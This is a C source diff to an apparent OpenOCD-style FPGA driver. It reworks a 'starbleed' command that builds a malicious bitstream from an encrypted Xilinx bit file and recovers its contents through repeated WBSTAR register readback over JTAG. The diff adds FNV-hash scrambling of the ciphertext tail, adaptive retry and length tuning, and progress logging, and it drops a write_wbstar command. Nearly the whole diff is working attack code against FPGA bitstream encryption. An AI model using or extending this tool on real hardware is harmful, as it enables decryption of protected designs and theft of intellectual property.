@@ -24,7 +24,7 @@
 #include "virtex2.h"
 #include "xilinx_bit.h"
 #include "pld.h"
-#include <sys/random.h>
+// #include <sys/random.h>
 
 uint32_t bswap32(const uint32_t input)
 {
@@ -155,51 +155,6 @@ static int virtex2_read_wbstar(struct pld_device *pld_device, uint32_t *status)
 	return ERROR_OK;
 }
 
-static int virtex2_write_wbstar(struct pld_device *pld_device, uint32_t wbstar)
-{
-	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
-	unsigned int i;
-	struct scan_field field;
-	uint8_t *bitstream = (uint8_t *)malloc(384);
-	// uint32_t *bitstream_in_word = (uint32_t *)bitstream;
-	memcpy(bitstream, write_wbstar_bitstream, 384);
-	field.in_value = NULL;
-
-	virtex2_set_instr(virtex2_info->tap, 0xb); /* JPROG_B */
-	jtag_execute_queue();
-	jtag_add_sleep(1000);
-
-	virtex2_set_instr(virtex2_info->tap, 0x5); /* CFG_IN */
-	jtag_execute_queue();
-
-	((uint32_t *)bitstream)[22] = wbstar;
-
-	for (i = 0; i < 384; i++)
-		bitstream[i] = flip_u32(bitstream[i], 8);
-
-	field.num_bits = 384 * 8;
-	field.out_value = bitstream;
-	jtag_add_dr_scan(virtex2_info->tap, 1, &field, TAP_DRPAUSE);
-	jtag_execute_queue();
-
-	jtag_add_tlr();
-
-	if (!(virtex2_info->no_jstart))
-		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
-	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-	if (!(virtex2_info->no_jstart))
-		virtex2_set_instr(virtex2_info->tap, 0xc); /* JSTART */
-	jtag_add_runtest(13, TAP_IDLE);
-	virtex2_set_instr(virtex2_info->tap, 0x3f); /* BYPASS */
-	jtag_execute_queue();
-
-	free(bitstream);
-
-	return ERROR_OK;
-}
-
 static int virtex2_load(struct pld_device *pld_device, const char *filename)
 {
 	struct virtex2_pld_device *virtex2_info = pld_device->driver_priv;
@@ -324,31 +279,6 @@ COMMAND_HANDLER(virtex2_handle_read_wbstar_command)
 	return ERROR_OK;
 }
 
-COMMAND_HANDLER(virtex2_handle_write_wbstar_command)
-{
-	struct pld_device *device;
-	uint32_t wbstar;
-	if (CMD_ARGC < 1)
-		return ERROR_COMMAND_SYNTAX_ERROR;
-
-	unsigned dev_id;
-	COMMAND_PARSE_NUMBER(uint, CMD_ARGV[0], dev_id);
-	COMMAND_PARSE_NUMBER(u32, CMD_ARGV[1], wbstar);
-	device = get_pld_device_by_num(dev_id);
-	if (!device)
-	{
-		command_print(CMD, "pld device '#%s' is out of bounds", CMD_ARGV[0]);
-		return ERROR_OK;
-	}
-
-	wbstar = bswap32(wbstar);
-	virtex2_write_wbstar(device, wbstar);
-
-	// command_print(CMD, "virtex2 wbstar register: 0x%8.8" PRIx32 "", status);
-
-	return ERROR_OK;
-}
-
 uint64_t get_timestamp(void)
 {
 	struct timeval tv;
@@ -356,24 +286,42 @@ uint64_t get_timestamp(void)
 	return tv.tv_sec * (uint64_t)1000000 + tv.tv_usec;
 }
 
+#define FNV_OFFSET_BASIS_32 2166136261
+#define FNV_PRIME_32 16777619
+
+uint32_t fnv1a_32bit(uint32_t input){
+	uint32_t hash = FNV_OFFSET_BASIS_32;
+	for(int i=0; i<4; i++){
+		hash ^= input>>i*8%0xff;
+		hash *= FNV_PRIME_32;
+	}
+	return hash;
+}
+
 COMMAND_HANDLER(virtex2_handle_starbleed_command)
 {
 	struct pld_device *device;
-	// uint32_t status;
+	uint32_t retry_times = 0;
 
 	struct xilinx_bit_file bit_file, bit_file_mod;
 	int retval;
-	uint64_t cur_time, prev_time = 0, elapsed_time, eta = 0;
+	uint64_t cur_time, prev_time = 0, elapsed_time, prev_elapsed_time = 1.0, eta = 0;
 
 	retval = xilinx_read_bit_file(&bit_file, CMD_ARGV[1]);
 	if (retval != ERROR_OK)
 		return retval;
+		
+	generate_malicious_bit_template(&bit_file, &bit_file_mod);
 
-	retval = xilinx_read_bit_file(&bit_file_mod, CMD_ARGV[2]);
-	if (retval != ERROR_OK)
-		return retval;
+	for(uint32_t i=0; i<bit_file_mod.length; i++){
+		printf("%02x", bit_file_mod.data[i]);
+		if((i+1)%16==0){
+			printf("\n");
+		}
+	}
+	printf("\n");
 
-	FILE *out_file = fopen(CMD_ARGV[3], "wb");
+	FILE *out_file = fopen(CMD_ARGV[2], "wb");
 
 	uint8_t *malicious_bitstream = malloc(bit_file_mod.length);
 
@@ -455,26 +403,27 @@ COMMAND_HANDLER(virtex2_handle_starbleed_command)
 				{
 					if (prev_wbstar_reg != wbstar_reg)
 					{
-						LOG_INFO("Rolling footer");
-						int rd = getrandom(&bit_file_mod.data[bit_file_mod.cipher_start + 8 * 16], bit_file_mod.dwc_length * 4 - 8 * 16, GRND_NONBLOCK);
-						if (rd == -1)
-						{
-							LOG_INFO("Failed to gen random");
+						// LOG_INFO("Rolling footer");
+						uint32_t *fabric_tail = (uint32_t*)&bit_file_mod.data[bit_file_mod.cipher_start + 8 * 16];
+						for(uint32_t i=0; i<bit_file_mod.dwc_length-32; i++){
+							fabric_tail[i] = fnv1a_32bit(fabric_tail[i]);
+						}
+
+						retry_times++;
+						if(retry_times > 5){
+							bit_file_mod.dwc_length+=2;
+							change_dwc_len(&bit_file_mod);
+							LOG_INFO("MAYBE TOO RADICAL, INCREASING DWC_LEN %d", bit_file_mod.dwc_length);
 						}
 						goto TRY_ONE_REG;
 					}
+					retry_times = 0;
 				}
 				prev_wbstar_reg = wbstar_reg;
 			}
 
 			wbstars[xored_val - 0xa] = wbstar_reg;
-			if (0)
-			{
-				LOG_INFO("Xored: %02x, rolling_offset: %d", xored_val, rolling_offset);
-				LOG_INFO("wbstar: 0x%8.8" PRIx32 "", wbstar_reg);
-			}
 		}
-		LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x, ETA(%.2lfh)", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3], (double)eta / 1000000 / 3600);
 
 		for (int i = 0; i < 4; i++)
 		{
@@ -487,7 +436,21 @@ COMMAND_HANDLER(virtex2_handle_starbleed_command)
 			elapsed_time = cur_time - prev_time;
 			prev_time = cur_time;
 			eta = (total_line_number - line_num) * elapsed_time / 50;
+
+			if((double)elapsed_time/(double)prev_elapsed_time > 1.5){
+				bit_file_mod.dwc_length++;
+				change_dwc_len(&bit_file_mod);
+				LOG_INFO("TRYING TO INCREASE DWC_LEN %d", bit_file_mod.dwc_length);
+			}else{
+				bit_file_mod.dwc_length-=10;
+				change_dwc_len(&bit_file_mod);
+				LOG_INFO("TRYING TO DECREASE DWC_LEN %d", bit_file_mod.dwc_length);
+			}
+
+			prev_elapsed_time = elapsed_time;
 			// LOG_INFO("ETA: %lf", (double)eta / 1000000 / 3600);
+			LOG_INFO("progress: %d/%d (%.2f%%), wbstar: %8.8x%8.8x%8.8x%8.8x, ETA(%.2lfh)", line_num, total_line_number, (float)line_num * 100 / (float)total_line_number, wbstars[0], wbstars[1], wbstars[2], wbstars[3], (double)eta / 1000000 / 3600);
+
 		}
 	}
 	fclose(out_file);
@@ -536,13 +499,6 @@ static const struct command_registration virtex2_exec_command_handlers[] = {
 		.mode = COMMAND_EXEC,
 		.handler = virtex2_handle_read_wbstar_command,
 		.help = "read wbstar register",
-		.usage = "pld_num",
-	},
-	{
-		.name = "write_wbstar",
-		.mode = COMMAND_EXEC,
-		.handler = virtex2_handle_write_wbstar_command,
-		.help = "write wbstar register",
 		.usage = "pld_num",
 	},
 	{
